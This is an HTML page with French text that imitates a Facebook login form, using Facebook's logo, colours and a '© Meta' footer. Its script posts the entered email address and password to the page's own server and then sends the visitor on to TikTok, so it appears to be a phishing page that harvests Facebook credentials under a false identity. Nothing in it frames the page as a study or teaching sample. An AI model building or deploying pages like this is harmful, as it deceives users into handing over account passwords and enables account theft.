<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Créer un compte</title>
  <style>
    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }

    .register-container {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }

    .logo {
      width: 60px;
      margin-bottom: 20px;
    }

    h3 {
      font-size: 20px;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    .btn-primary {
      background-color: #42b72a;
      color: white;
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }

    .link {
      display: block;
      margin-top: 10px;
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
    }

    footer {
      margin-top: 20px;
      font-size: 12px;
      color: #606770;
    }
  </style>
</head>
<body>
  <div class="register-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
    
    

    <input type="text" placeholder="Adresse e-mail" id="email">
    <input type="password" placeholder="Mot de passe" id="password">
    
    <button class="btn-primary" onclick="creerCompte()">Seconnecter</button>
    
    <a href="login.html" class="link">Mot de passe oublié ?</a>
    
    <footer>
      <p>© Meta</p>
    </footer>
  </div>

  <script>
    function creerCompte() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      fetch("/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ email, password })
      })
      .then(res => res.json())
      .then(data => {
        alert(data.message);
        if (data.message === "تم التسجيل بنجاح") {
          window.location.href = "https://www.tiktok.com";
        }
      });
    }
  </script>
</body>
</html>
